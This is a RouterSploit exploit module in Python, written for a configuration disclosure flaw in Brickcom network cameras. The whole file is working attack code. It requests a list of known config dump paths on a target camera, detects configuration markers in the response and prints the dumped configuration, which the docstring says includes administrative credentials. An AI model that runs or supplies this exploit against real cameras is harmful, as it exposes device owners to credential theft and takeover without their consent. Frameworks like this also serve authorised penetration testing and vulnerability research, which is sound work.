from routersploit import (
    exploits,
    print_error,
    print_info,
    print_success,
    print_status,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Brickcom Corporation Network Camera Configuration Disclosure vulnerability.
    If target is vulnerable it is possible to read device configuration including administrative credentials.
    """
    __info__ = {
        'name': 'Brickcom Corp Network Camera Conf Disclosure',
        'description': 'Module exploits Brickcom Corporation Network Camera Configuration Dislosure vulnerability. If target is vulnerable '
                       'it is possible to read device configuraiton including administrative credentials.',
        'authors': [
            'Orwelllabs',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39696/',
        ],
        'devices': [
            'Brickcom Corporation Network Camera',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port', validators=validators.integer)  # default port

    resources = [
        '/configfile.dump?action=get',
        '/configfile.dump.backup',
        '/configfile.dump.gz',
        '/configfile.dump',
    ]

    def __init__(self):
        self.content = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Dumping configuration...")
            print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for resource in self.resources:
            url = "{}:{}{}".format(self.target, self.port, resource)
            response = http_request(method="GET", url=url)
            if response is None:
                break

            if any([setting in response.text for setting in ["DeviceBasicInfo", "UserSetSetting", "DDNSSetting"]]):
                self.content = response.text
                return True  # target is vulnerable

        return False  # target is not vulnerable
